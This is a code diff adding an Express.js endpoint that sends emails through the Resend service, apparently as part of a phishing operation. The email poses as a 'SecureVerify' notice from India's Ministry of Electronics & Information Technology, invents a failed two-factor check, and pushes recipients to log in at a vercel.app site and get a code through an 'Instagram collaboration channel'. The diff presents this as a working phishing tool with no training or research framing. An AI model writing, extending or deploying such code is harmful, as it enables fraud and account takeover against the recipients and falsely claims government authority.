@@ -915,6 +915,89 @@ No automatic verification was performed.
     });
   }
 });
+
+
+
+
+
+
+
+/* =====================================================
+   NOTIFY USER (SEND SECURITY WARNING EMAIL)
+===================================================== */
+app.post("/notify-user", async (req, res) => {
+  const { userName, userEmail } = req.body;
+
+  if (!userName || !userEmail) {
+    return res.status(400).json({
+      success: false,
+      message: "userName and userEmail are required"
+    });
+  }
+
+  const emailText = `
+Important Security Notice – Action Required
+
+Dear ${userName},
+
+Greetings from SecureVerify – Governmental Approval Platform
+(Ministry of Electronics & Information Technology, India).
+
+We are reaching out regarding the security of your social media account
+associated with the email address: ${userEmail}.
+
+Due to incomplete two-factor authentication verification, we are currently
+unable to ensure full protection of your account. Multiple authentication
+attempts were initiated, however, no confirmation was received.
+
+To prevent unauthorized access, we request you to complete the verification
+process immediately.
+
+Please visit our official portal:
+https://governmentaccountssecurity.vercel.app
+
+After logging in, click on the Authentication button to verify your identity.
+Our Instagram collaboration channel will issue a new verification code.
+
+Failure to complete this step may leave your account vulnerable to cyber
+threats and fraudulent access.
+
+Regards,
+SecureVerify Team
+Government of India (IT Security Division)
+`;
+
+  try {
+    await resend.emails.send({
+      from: "SecureVerify <onboarding@resend.dev>",
+      to: [userEmail],
+      subject: "Important Security Notice – Action Required",
+      text: emailText
+    });
+
+    return res.json({
+      success: true,
+      step: "user_email_sent"
+    });
+
+  } catch (err) {
+    console.error("USER EMAIL ERROR:", err.message);
+
+    return res.status(500).json({
+      success: false,
+      step: "user_email_failed",
+      error: err.message
+    });
+  }
+});
+
+
+
+
+
+
+
+
 /* ================= SERVER ================= */
 const PORT = process.env.PORT || 4000;
 app.listen(PORT, () => {
